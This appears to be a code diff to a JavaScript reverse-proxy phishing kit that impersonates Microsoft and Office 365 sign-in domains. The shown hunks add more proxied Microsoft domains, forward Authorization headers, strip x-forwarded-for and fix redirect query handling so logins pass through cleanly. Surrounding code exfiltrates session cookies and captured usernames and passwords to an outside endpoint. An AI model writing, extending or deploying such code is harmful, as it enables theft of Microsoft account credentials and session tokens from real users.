@@ -14,7 +14,9 @@ const PROXY_DOMAINS = [
   'account.microsoft.com',
   'aadcdn.msauth.net',
   'www.office.com',
-  'office.com'
+  'office.com',
+  'microsoft365.com',
+  'outlook.office.com'
 ];
 
 // For detecting auth cookies
@@ -42,7 +44,7 @@ async function exfiltrateCookies(cookieText, ip, url) {
   } catch (e) {}
 }
 
-// ==================== URL PARSING ====================
+// ==================== CRITICAL: URL PARSING WITH QUERY CLEANING ====================
 function parseProxiedUrl(pathname) {
   // Check if this is a proxied request: /_p/domain/path
   if (pathname.startsWith(PROXY_PREFIX)) {
@@ -72,12 +74,40 @@ function shouldProxyDomain(hostname) {
   return PROXY_DOMAINS.includes(hostname);
 }
 
+// CRITICAL FIX: Remove 'path' parameters from query string
+// These are added by Office.com redirects and break Microsoft login
+function cleanQueryString(search) {
+  if (!search) return '';
+  const params = new URLSearchParams(search);
+  let modified = false;
+  
+  // Remove any 'path' parameters that were added by our proxy routing
+  for (const key of Array.from(params.keys())) {
+    if (key === 'path') {
+      params.delete(key);
+      modified = true;
+    }
+  }
+  
+  if (!modified) return search;
+  const newSearch = params.toString();
+  return newSearch ? '?' + newSearch : '';
+}
+
 function rewriteLocation(location, currentDomain) {
   if (!location) return location;
   
   try {
-    // Handle relative redirects
+    // Handle relative redirects - clean them first
     if (location.startsWith('/')) {
+      // Check if relative location has query string with 'path' params
+      const qIndex = location.indexOf('?');
+      if (qIndex !== -1) {
+        const pathPart = location.substring(0, qIndex);
+        const queryPart = location.substring(qIndex);
+        const cleanedQuery = cleanQueryString(queryPart);
+        location = pathPart + cleanedQuery;
+      }
       return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${currentDomain}${location}`;
     }
     
@@ -86,21 +116,7 @@ function rewriteLocation(location, currentDomain) {
     // If redirecting to a domain we proxy, rewrite it
     if (shouldProxyDomain(url.hostname)) {
       // Clean any path parameters from the URL
-      let cleanSearch = url.search;
-      if (cleanSearch) {
-        const params = new URLSearchParams(cleanSearch);
-        let hasPathParams = false;
-        for (const key of params.keys()) {
-          if (key === 'path') {
-            params.delete(key);
-            hasPathParams = true;
-          }
-        }
-        if (hasPathParams) {
-          cleanSearch = params.toString();
-          cleanSearch = cleanSearch ? '?' + cleanSearch : '';
-        }
-      }
+      const cleanSearch = cleanQueryString(url.search);
       
       return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${cleanSearch}${url.hash}`;
     }
@@ -165,11 +181,11 @@ export default async function handleRequest(request) {
     });
   }
 
-  // Build the upstream URL - IMPORTANT: preserve the original query string AS IS
-  // Do NOT modify the query string - let Microsoft handle it
-  const upstreamUrl = `https://${targetDomain}${targetPath}${url.search}`;
+  // CRITICAL: Clean 'path' parameters before forwarding to upstream
+  const cleanSearch = cleanQueryString(url.search);
+  const upstreamUrl = `https://${targetDomain}${targetPath}${cleanSearch}`;
   
-  console.log(`[PROXY] ${request.method} ${url.pathname} -> ${upstreamUrl}`);
+  console.log(`[PROXY] ${request.method} ${url.pathname}${url.search} -> ${upstreamUrl}`);
 
   // Handle OPTIONS preflight
   if (request.method === 'OPTIONS') {
@@ -178,7 +194,7 @@ export default async function handleRequest(request) {
       headers: {
         'Access-Control-Allow-Origin': '*',
         'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, PATCH, OPTIONS',
-        'Access-Control-Allow-Headers': 'Content-Type, Cookie, Set-Cookie',
+        'Access-Control-Allow-Headers': 'Content-Type, Cookie, Set-Cookie, Authorization',
         'Access-Control-Allow-Credentials': 'true',
         'Access-Control-Max-Age': '86400'
       }
@@ -189,7 +205,7 @@ export default async function handleRequest(request) {
   const headers = new Headers();
   
   // Copy relevant headers
-  const headersToCopy = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'referer', 'origin', 'cookie'];
+  const headersToCopy = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'referer', 'origin', 'cookie', 'authorization'];
   for (const h of headersToCopy) {
     const val = request.headers.get(h);
     if (val) headers.set(h, val);
@@ -206,9 +222,9 @@ export default async function handleRequest(request) {
   headers.delete('content-length');
   headers.delete('x-forwarded-host');
   headers.delete('x-forwarded-proto');
+  headers.delete('x-forwarded-for');
 
   let requestBody = null;
-  let credentialsCaptured = false;
 
   // Handle POST requests for credentials
   if (request.method === 'POST') {
@@ -219,7 +235,6 @@ export default async function handleRequest(request) {
       
       if (user && pass) {
         console.log(`[CREDS] Captured: ${user}`);
-        credentialsCaptured = true;
         await sendToVercel('credentials', { 
           ip, user, pass, url: url.href 
         });
